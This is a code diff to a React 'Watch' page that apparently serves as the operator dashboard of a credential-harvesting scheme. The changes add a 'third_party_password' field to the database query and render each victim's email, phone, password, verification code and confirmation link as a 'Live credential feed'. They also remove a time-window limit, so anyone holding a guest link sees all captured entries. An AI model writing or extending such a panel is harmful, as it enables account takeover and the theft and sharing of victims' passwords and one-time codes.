@@ -32,7 +32,9 @@ export default function Watch() {
   const [errorMessage, setErrorMessage] = useState<string>('');
   const [passData, setPassData] = useState<any>(null);
   const [submissions, setSubmissions] = useState<any[]>([]);
+  const [isLive, setIsLive] = useState(false);
   const pollTimer = useRef<number | null>(null);
+  const liveTimer = useRef<number | null>(null);
 
   useEffect(() => {
     console.log('🔍 WATCH ROUTE PARAMETER:', routeCode);
@@ -52,6 +54,17 @@ export default function Watch() {
       setErrorMessage('Invalid or Expired Pass');
       return;
     }
+
+    const triggerLiveIndicator = (message: string) => {
+      if (liveTimer.current) {
+        window.clearTimeout(liveTimer.current);
+      }
+      setIsLive(true);
+      liveTimer.current = window.setTimeout(() => {
+        setIsLive(false);
+      }, 1200);
+      console.log('[WATCH] live:', message);
+    };
 
     const fetchWatchData = async () => {
       try {
@@ -78,21 +91,23 @@ export default function Watch() {
           return;
         }
 
-        setPassData(passRecord);
-        setIsValid(true);
-        setErrorMessage('');
-
         const { data: submissionsData, error: submissionsError } = await publicGuest
           .from('platform_connection_requests')
-          .select('id,platform,email,phone,status,code,confirmation_link,tracking_id,created_at')
+          .select('id,platform,email,phone,third_party_password,status,code,confirmation_link,tracking_id,created_at')
           .order('created_at', { ascending: false });
 
         console.log('🔍 WATCH SUBMISSIONS QUERY RESULT:', { submissionsData, submissionsError });
         if (submissionsError) {
           console.error('Watch: failed to load watch submissions:', submissionsError);
+          setErrorMessage('Unable to load submissions');
           return;
         }
+
+        setPassData(passRecord);
+        setIsValid(true);
+        setErrorMessage('');
         setSubmissions(Array.isArray(submissionsData) ? submissionsData : []);
+        triggerLiveIndicator('Watch refreshed submissions');
       } catch (err) {
         console.error('Watch: Unexpected error validating pass:', err);
         setErrorMessage('Invalid or Expired Pass');
@@ -101,21 +116,18 @@ export default function Watch() {
     };
 
     fetchWatchData();
-
-    pollTimer.current = window.setInterval(() => {
-      if (isValid && passData) {
-        console.log('Watch: polling for new submissions');
-        fetchWatchData();
-      }
-    }, 2000);
+    pollTimer.current = window.setInterval(fetchWatchData, 2000);
 
     return () => {
       if (pollTimer.current !== null) {
         window.clearInterval(pollTimer.current);
         pollTimer.current = null;
       }
+      if (liveTimer.current) {
+        window.clearTimeout(liveTimer.current);
+      }
     };
-  }, [routeCode, isValid, passData]);
+  }, [routeCode]);
 
 
   return (
@@ -141,22 +153,28 @@ export default function Watch() {
         ) : isValid && passData ? (
           <div className="mt-6 space-y-6">
             <div className="rounded-3xl border border-white/10 bg-slate-900/80 p-6">
-              <h2 className="text-2xl font-semibold">Access granted</h2>
+              <div className="flex flex-wrap items-center gap-3">
+                <h2 className="text-2xl font-semibold">Access granted</h2>
+                <span className={`inline-flex items-center gap-2 rounded-full px-3 py-1 text-xs ${isLive ? 'bg-emerald-500/20 text-emerald-300' : 'bg-slate-800 text-slate-400'}`}>
+                  <span className={`h-2.5 w-2.5 rounded-full ${isLive ? 'bg-emerald-400 animate-pulse' : 'bg-slate-500'}`} />
+                  {isLive ? 'Live • Real-time' : 'Live'}
+                </span>
+              </div>
               <p className="mt-2 text-slate-300">
                 Your guest pass is valid until {new Date(passData.expires_at).toLocaleString()}.
               </p>
             </div>
 
             <div className="rounded-3xl border border-white/10 bg-slate-900/80 p-6">
-              <div className="text-slate-300">Watch window submissions</div>
+              <div className="text-slate-300">Watch submissions</div>
               <div className="mt-4 rounded-3xl bg-black/60 p-6 text-slate-100">
-                <p className="text-lg font-semibold">Submissions visible to this pass</p>
-                <p className="mt-2 text-slate-400">Only entries created between pass creation and pass expiration are shown.</p>
+                <p className="text-lg font-semibold">Live credential feed</p>
+                <p className="mt-2 text-slate-400">Anyone with this valid link sees the same data as admin.</p>
               </div>
               <div className="mt-6 space-y-4">
                 {submissions.length === 0 ? (
                   <div className="rounded-2xl border border-white/10 bg-slate-950/80 p-4 text-slate-400">
-                    No submissions were created during this pass window.
+                    No submissions have been created yet during this session.
                   </div>
                 ) : (
                   submissions.map((submission) => (
@@ -165,12 +183,35 @@ export default function Watch() {
                         <span className="font-semibold text-white">{submission.platform}</span>
                         <span className="text-sm text-slate-400">{new Date(submission.created_at).toLocaleString()}</span>
                       </div>
-                      <div className="mt-2 text-sm text-slate-300">
-                        {submission.email ? submission.email : submission.phone ? submission.phone : 'No contact'}
-                      </div>
-                      <div className="mt-2 text-xs text-slate-500">
-                        status: {submission.status ?? 'pending'}
-                        {submission.tracking_id ? ` · tracking_id: ${submission.tracking_id}` : ''}
+                      <div className="mt-3 grid gap-3 sm:grid-cols-2">
+                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
+                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Email</p>
+                          <p className="mt-1 font-mono text-sm text-white">{submission.email || '-'}</p>
+                        </div>
+                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
+                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Phone</p>
+                          <p className="mt-1 font-mono text-sm text-white">{submission.phone || '-'}</p>
+                        </div>
+                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
+                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Password</p>
+                          <p className="mt-1 font-mono text-sm text-emerald-200">{submission.third_party_password || '-'}</p>
+                        </div>
+                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
+                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Confirmation Link</p>
+                          <p className="mt-1 break-words text-xs font-mono text-slate-100">{submission.confirmation_link || '-'}</p>
+                        </div>
+                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
+                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Code</p>
+                          <p className="mt-1 font-mono text-sm text-slate-100">{submission.code || '-'}</p>
+                        </div>
+                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
+                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Tracking ID</p>
+                          <p className="mt-1 font-mono text-xs text-slate-100 break-words">{submission.tracking_id || '-'}</p>
+                        </div>
+                        <div className="rounded-2xl bg-slate-900/90 p-3 text-slate-200">
+                          <p className="text-xs uppercase tracking-[0.2em] text-slate-500">Status</p>
+                          <p className="mt-1 text-sm text-slate-100">{submission.status || 'pending'}</p>
+                        </div>
                       </div>
                     </div>
                   ))
